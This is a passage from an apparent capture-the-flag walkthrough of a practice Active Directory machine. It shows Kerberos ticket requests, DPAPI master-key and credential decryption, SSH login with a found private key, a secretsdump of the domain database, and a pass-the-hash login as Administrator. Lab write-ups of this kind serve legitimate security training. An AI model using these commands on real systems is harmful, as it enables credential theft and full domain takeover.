SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Second-Line Support/Archived Users/todd.wolfe/Music [dir]
...
```
It looks like there is additional folder name `Second-Line Support/Archived Users` in `IT` share. It looks promising, so I want to interact with it directly by using `impacket-smbclient` which works better with kerberos authentication:
```
└─$ impacket-getTGT voleur.htb/todd.wolfe:NightT1meP1dg3on14 -k                 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
```
```
export KRB5CCNAME=/home/kali/htb/todd.wolfe.ccache
```
```
└─$ impacket-smbclient voleur.htb/todd.wolfe:NightT1meP1dg3on14@dc.voleur.htb -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 Second-Line Support
```
All people know that, `AppData/Roaming/Microsoft/Credentials` or `AppData/Roaming/Microsoft/Vault`  usually contains Credentials which is encrypted by `DPAPI` Windows. We need to research about how `DPAPI` works in Windows.<br>

*DPAPI (Data Protection API) is a built-in Windows cryptographic service that lets applications encrypt and decrypt sensitive data (like passwords, API keys, and tokens) without having to manage encryption keys themselves.*

For example, we have a credential. After that, we want to us DPAPI to encrypt that credential. First of all, windows will directly create a master key and encrypt it by user NTLM hash. This encrypted master key is stored in `AppData/Roaming/Microsoft/Protect/SID/GUID`. Then windows will use that master key to encrypt credential and store that encrypted credential to  `AppData/Roaming/Microsoft/Credentials` or `AppData/Roaming/Microsoft/Vault`. That encrypted credential usually is called `blob`:
```
└─$ impacket-smbclient voleur.htb/todd.wolfe:NightT1meP1dg3on14@dc.voleur.htb -k
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
```
```
# pwd
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
```
To decrypt it, first of all, we must find out master key by using `impacket-dpapi masterkey`:
```
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
After that, we will continue using `impacket-dpapi credential` to decrypt blob and findout the credential:
```
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
```
└─$ nxc smb 10.129.73.122 -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -k         
SMB         10.129.73.122   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.73.122   445    DC               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```
Great, we find out a new credential: `jeremy.combs:qT3V9pLXyN7W4m`. Next, we can use that credential to find out any shares which it has permission:
```
└─$ nxc smb 10.129.73.122 -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -k --share "IT" --spider "IT" --regex "."
SMB         10.129.73.122   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.73.122   445    DC               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
SMB         10.129.73.122   445    DC               [*] Spidering .
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Third-Line Support [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Third-Line Support/. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Third-Line Support/.. [dir]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Third-Line Support/id_rsa [lastm:'2025-01-30 11:11' size:2602]
SMB         10.129.73.122   445    DC               //10.129.73.122/IT/Third-Line Support/Note.txt.txt [lastm:'2025-01-30 11:07' size:186]
```
We find out two new files `id_rsa` and `Note.txt.txt`. 
```
└─$ cat Note.txt.txt 
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```
Combine the content of `Note.txt.txt` file and `Access_review.xlsx` I guess that `id_rsa` is private key of `svc_backup` user which use for ssh connection:
```
└─$ chmod 600 id_rsa
```
```
└─$ ssh -i id_rsa svc_backup@10.129.73.122 -p2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 24 13:51:38 PST 2026

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   31%       IPv4 address for eth0: 10.129.73.122
  Swap usage:     4%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Nov 24 13:30:33 2026 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                 [ OK ] 
svc_backup@DC:~$ 
```
From this user, I can find out some sensitive files `ntds.dit, SECURITY, SYSTEM`. So we can use `impacket-secretsdump` to extract all information:
```
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
```
```
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls Active\ Directory/
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls registry/
SECURITY  SYSTEM
```
```
└─$ impacket-secretsdump -ntds ntds.dit -security SECURITY -system SYSTEM LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM 
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```
```
└─$ impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 -no-pass -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```
```
└─$ evil-winrm -i dc.voleur.htb -u 'Administrator' -p 'e656e07c56d831611b577b160b259ad2' -K Administrator.ccache -r voleur.htb
```
Okey now we can get the final flag:
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---        11/24/2026   3:24 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```